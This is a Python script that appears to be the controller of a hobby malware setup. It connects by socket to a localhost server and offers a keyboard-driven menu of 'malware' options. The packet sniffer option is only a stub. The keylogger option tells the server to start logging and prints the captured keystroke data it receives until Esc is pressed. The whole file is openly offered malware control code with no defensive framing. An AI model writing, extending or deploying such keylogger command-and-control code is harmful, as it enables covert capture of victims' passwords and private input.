import threading
import socket
from pynput import keyboard

exit_program_flag = threading.Event()
exit_keylogger = threading.Event()
chosen_malware = None

# # Server configuration VM
# HOST = 'localhost'
# PORT = 12345

# Server configuration local
HOST = 'localhost'
PORT = 12346

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((HOST, PORT))
print("Connected to the server")

def kill_keylogger(key):
    global exit_keylogger
    if key == keyboard.Key.esc:
        exit_keylogger.set()
        return False

def listener_thread():
    def on_malware_key_press(key):
        global chosen_malware
        if hasattr(key, 'char'):
            chosen_malware = key.char
        return False

    def on_key_release(key):
        global exit_program_flag
        if key == keyboard.Key.esc:
            exit_program_flag.set()
            return False

    with keyboard.Listener(
        on_press=on_malware_key_press,
        on_release=on_key_release
    ) as listener:
        listener.join()  # Wait for listener thread to exit

def keylogger(client_socket):    
    global exit_keylogger
    while not exit_keylogger.is_set():
        data = client_socket.recv(1024)
        data = data.decode()
        print(f"Received: {data}")

# Main loop
while True:
    user_choice_thread = threading.Thread(target=listener_thread)
    user_choice_thread.start()
    user_choice_thread.join()

    # Add a loop to check for the exit condition continuously
    while not exit_program_flag.is_set():
        if chosen_malware == '1':
            print("You pressed for packet sniffer")

        elif chosen_malware == '2':
            client_socket.send(chosen_malware.encode())
            keylogger_thread = threading.Thread(target=keylogger, args=(client_socket,))
            keylogger_thread.start()

            with keyboard.Listener(
                on_release=kill_keylogger
            ) as listener:
                listener.join()

            keylogger_thread.join()
            
            # Close the client socket after the keylogger thread has completed
            client_socket.close()

        elif chosen_malware is not None:
            print("Please choose a valid option (1 or 2)")

        user_choice_thread = threading.Thread(target=listener_thread)
        user_choice_thread.start()
        user_choice_thread.join()

    # Exit the loop and thread when the user presses escape
    if exit_program_flag.is_set():
        client_socket.close()
        break
